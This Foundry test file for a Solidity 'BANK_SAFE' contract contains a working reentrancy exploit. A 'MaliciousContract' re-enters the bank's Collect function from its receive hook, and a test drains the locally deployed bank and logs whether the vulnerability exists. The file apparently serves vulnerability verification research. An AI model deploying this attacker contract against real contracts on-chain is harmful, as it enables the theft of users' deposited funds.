// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract MaliciousContract {
    BANK_SAFE public bank;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _bankAddress) {
        bank = BANK_SAFE(_bankAddress);
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    function attack(uint _amount) public {
        attackAmount = _amount;
        bank.Collect(_amount);
    }

    receive() external payable {
        if (address(bank).balance >= attackAmount && attackCount < 2) {
            attackCount++;
            bank.Collect(attackAmount);
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract BankSafeTest is Test {
    BANK_SAFE public bank;
    MaliciousContract public attacker;
    LogFile public logFile;
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);

        vm.prank(owner);
        logFile = new LogFile();

        vm.prank(owner);
        bank = new BANK_SAFE();

        // Initialize required contract state
        vm.prank(owner);
        bank.SetMinSum(1 ether);

        vm.prank(owner);
        bank.SetLogFile(address(logFile));

        attacker = new MaliciousContract(payable(address(bank)));
        vm.deal(address(attacker), 10 ether);
    }

    function testReentrancyAttack() public {
        // Setup initial balances
        vm.prank(user);
        bank.Deposit{value: 5 ether}();

        vm.prank(address(attacker));
        attacker.deposit{value: 5 ether}();

        // Pre-attack state capture
        console.log("\n--- BEFORE-Trigger State ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerETHBefore = address(attacker).balance;
        uint256 attackerInternalBefore = bank.balances(address(attacker));

        console.log("Bank ETH balance before attack: %s wei", bankBalanceBefore);
        console.log("Attacker ETH balance before attack: %s wei", attackerETHBefore);
        console.log("Attacker internal balance before attack: %s wei", attackerInternalBefore);

        console.log("\n--- Trigger Attack ---");
        // Perform attack
        vm.prank(address(attacker));
        attacker.attack(5 ether);

        console.log("\n--- AFTER-Trigger State ---");
        // Post-attack state capture
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerETHAfter = address(attacker).balance;
        uint256 attackerInternalAfter = bank.balances(address(attacker));

        console.log("Bank ETH balance after attack: %s wei", bankBalanceAfter);
        console.log("Attacker ETH balance after attack: %s wei", attackerETHAfter);
        console.log("Attacker internal balance after attack: %s wei", attackerInternalAfter);

        // Vulnerability validation
        bool bankDrained = (bankBalanceAfter == 0);
        bool attackerGained10 = (attackerETHAfter == attackerETHBefore + 10 ether);
        bool internalBalanceInconsistent = (attackerInternalAfter >= attackerInternalBefore);
        
        console.log("\n--- Vulnerability Verification ---");
        console.log("Bank fully drained: %s", bankDrained ? "YES" : "NO");
        console.log("Attacker gained 10 ETH: %s", attackerGained10 ? "YES" : "NO");
        console.log("Internal balance inconsistency: %s", internalBalanceInconsistent ? "YES" : "NO");
        
        // Final verdict
        if (bankDrained && attackerGained10 && internalBalanceInconsistent) {
            console.log("\nVulnerability Exists: Bank drained, attacker gained 10 ETH, and internal balances are inconsistent.");
        } else {
            console.log("\nVulnerability not Exist: Attack didn't fully execute or internal state updated correctly");
        }
    }

    function testNormalWithdrawal() public {
        // Normal user deposits
        vm.prank(user);
        bank.Deposit{value: 5 ether}();

        // Normal withdrawal
        uint initialBalance = user.balance;
        vm.prank(user);
        bank.Collect(5 ether);

        assertEq(user.balance, initialBalance + 5 ether);
        assertEq(address(bank).balance, 0 ether);
    }
}